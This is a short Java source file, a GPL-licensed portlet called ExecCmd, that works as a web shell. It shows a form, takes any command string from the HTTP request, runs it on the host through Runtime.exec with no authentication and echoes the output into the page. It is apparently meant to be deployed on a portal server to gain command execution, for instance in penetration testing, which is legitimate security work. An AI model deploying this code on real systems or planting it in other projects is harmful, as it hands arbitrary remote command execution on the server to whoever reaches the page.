package org.kost.own;

// Main stuff. (C) Vlatko Kosturjak. Distributed under GPL.

import javax.portlet.*;
import java.io.*;

public class ExecCmd extends GenericPortlet {

	public void init (PortletConfig portletConfig) throws UnavailableException, PortletException
	{
		super.init(portletConfig);
	}

	public void processAction(ActionRequest request, ActionResponse response)
	throws PortletException, PortletSecurityException, IOException
	{
		response.setRenderParameters(request.getParameterMap());
	}


	public void doView(RenderRequest request, RenderResponse response)
	throws PortletException, IOException
	{

        String OS;
        String prefix;

        OS = System.getProperty("os.name");
        if (OS.startsWith("Windows")){
            prefix = "cmd /c ";
        }
        else{
            prefix = "/bin/sh -c ";
        }

		response.setContentType("text/html");
		PrintWriter writer = response.getWriter();
		writer.println("<p>Execute command</p>");
		writer.println("<p><form action=\""+response.createActionURL()+"\" method=\"POST\">");
		writer.println("<input name=\""+response.getNamespace()+"cmd\" />");
		writer.println("<input name=\"submit\" type=\"submit\" value=\"Execute\" />");
		writer.println("</form></p>");

		String cmd=request.getParameter(response.getNamespace()+"cmd");

		if (cmd == null) {
			writer.println("<p>No command to execute</p>");
		} else {
			writer.println("<p>Executing: "+prefix+cmd+"</p>");
			writer.println("<hr><pre>");
			Process p = Runtime.getRuntime().exec(cmd);
			OutputStream os = p.getOutputStream();
			InputStream in = p.getInputStream();
			DataInputStream dis = new DataInputStream(in);
			String disr = dis.readLine();
			while ( disr != null ) {
				writer.println(disr);
				disr = dis.readLine();
			}
			writer.println("</pre><hr>");
		}

	}

}

